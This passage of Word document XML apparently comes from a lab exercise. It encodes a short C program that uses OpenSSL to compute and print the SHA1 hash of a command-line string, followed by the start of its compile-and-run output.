          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of buf var</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e.</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r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ude</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>&lt;open</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l/</w:t>
      </w:r>
      <w:r>
        <w:t>sha.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pP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r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>gn, char</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>*a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>gv[])</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>ed char</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p[SHA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>DIG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>LE</w:t>
      </w:r>
      <w:r>
        <w:t>NG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>H];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:t>char buf[S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:t>A_DIG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>LE</w:t>
      </w:r>
      <w:r>
        <w:t>NG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>H*2];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">f ( </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>gn != 2 ) {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("Usage:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:t>s s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>gv[0]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="542" w:right="7563"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>urn -1;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>(buf,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">0x0, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:t>HA_D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>LE</w:t>
      </w:r>
      <w:r>
        <w:t>NG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>H*2);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:ind w:left="340" w:right="3378"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">0x0, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:t>HA_D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>LE</w:t>
      </w:r>
      <w:r>
        <w:t>NG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">H); </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:t>HA1((uns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gned char</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>*)a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>gv[1],</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>en(a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">gv[1]), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="10"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:t>for (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>=0;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>&lt; S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:t>A_DIG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>LE</w:t>
      </w:r>
      <w:r>
        <w:t>NG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>H;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>++) {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="542" w:right="4083"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>f((char*)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>(buf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">*2]), "%02x", </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>p[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>]);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">f("SHA1 of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s %s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n", </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>gv[1], buf);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>urn 0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="100"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1680" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId32">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spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ha1.c -</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ssl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>crypto</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId33">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a.out REC</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:t>HA1 of R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
